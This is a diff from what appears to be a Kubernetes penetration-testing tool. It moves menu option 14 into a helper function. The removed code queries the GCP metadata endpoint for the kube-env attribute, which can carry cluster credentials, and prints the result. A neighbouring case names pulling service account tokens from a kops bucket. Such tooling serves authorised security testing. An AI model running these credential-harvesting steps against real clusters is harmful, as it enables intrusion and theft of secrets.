@@ -650,22 +650,7 @@ func Main() {
 
 		// [14] Request kube-env from GCP Metadata API [GCP only]
 		case "14", "attack-kube-env-gcp":
-			// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
-			var headers []HeaderLine
-			headers = []HeaderLine{
-				{"Metadata-Flavor", "Google"},
-			}
-			kubeEnv, _ := GetRequest("http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", headers, false)
-			if (kubeEnv == "") || (strings.HasPrefix(kubeEnv, "ERROR:")) {
-				println("[-] Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
-				// TODO: Should we get error code the way we used to:
-				// fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
-				break
-			}
-			kubeEnvLines := strings.Split(string(kubeEnv), "\n")
-			for _, line := range kubeEnvLines {
-				println(line)
-			}
+			attackKubeEnvGCP(interactive)
 
 		// [15] Pull Kubernetes service account tokens from Kop's bucket in GCS [GCP only]
 		case "15", "attack-kops-gcs-1":
